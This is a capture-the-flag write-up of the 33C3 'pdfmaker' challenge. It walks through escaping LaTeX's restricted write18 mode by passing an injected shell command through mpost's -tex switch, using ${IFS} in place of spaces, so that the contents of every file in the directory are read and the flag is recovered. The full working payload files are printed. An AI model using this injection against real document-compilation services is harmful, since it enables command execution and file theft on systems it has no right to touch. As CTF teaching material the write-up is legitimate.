# pdfmaker

>pdfmaker (75)
>
>Solves: 133
>
>Just a tiny application, that lets the user write some files and >compile them with pdflatex. What can possibly go wrong?
>
>nc 78.46.224.91 24242

We connect to the server and see:

    Welcome to p.d.f.maker! Send '?' or 'help' to get the help. Type 'exit' to disconnect.
    >

>\> help

    Available commands: ?, help, create, show, compile.
    Type 'help COMMAND' to get information about the specific command.

>\> help show

    Shows the content of a file. Syntax: show TYPE NAME
    TYPE: type of the file. Possible types are log, tex, sty, mp, bib
    NAME: name of the file (without type ending)

>\> help compile

    Compiles a tex file with the help of pdflatex. Syntax: compile NAME
    NAME: name of the file (without type ending)

>\> help create

    Create a file. Syntax: create TYPE NAME
    TYPE: type of the file. Possible types are log, tex, sty, mp, bib
    NAME: name of the file (without type ending)
    The created file will have the name NAME.TYPE

When I understood that we could compile arbitrary .tex files, I remembered a blog-post I read a while back regarding running shell commands from latex: [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

It's worth to mention that I also tried creating a .tex file running ```\immediate\write18{ls>out.log}```, but write18 was set to restricted mode. I guess we have to do this the hard way!

Since we know that we can write .mp-files (per ```help create```), this seems to be the right solution. We simply follow the blog instructions:

>\> create mp test

We enter

    verbatimtex
    \documentclass{minimal}
    \begin{document}
    etex
    beginfig (1)
    label(btex blah etex, origin);
    endfig;
    \end{document}
    bye
    \q

As the blog-post says, we use ```mpost``` to compile the .mp-file, and pass in the switch ```-tex``` with a shell command that we want to run. Awesome!

With regards to what command we should run, I first did a couple of tests with a simple (ls)>ls.log, and saw that the flag file changed its name randomly. I tried creating extra tex-files that would ```(cat FILENAME)>ls.log``` but I couldn't get that to work.

I ended up with running ```bash -c (cat $(find .))>ls.log``` instead. Note that per the blog-post, we have to insert ```${IFS}``` instead of spaces.

>\> create tex lol

    \documentclass{article}
    \begin{document}
    \immediate\write18{mpost -ini \"-tex=bash -c (cat${IFS}$(find${IFS}.))>ls.log\" \"test.mp\"}
    \end{document}
    \q

>\> compile lol

After that successfully runs, we can simply ```show``` the file we wrote to:

>\> show log ls

We will see the contents from all the files in the directory, one of them which contains:

> 33C3_pdflatex_1s_t0t4lly_s3cur3!

Score! I have added a automated script for capturing this flag, in this directory.
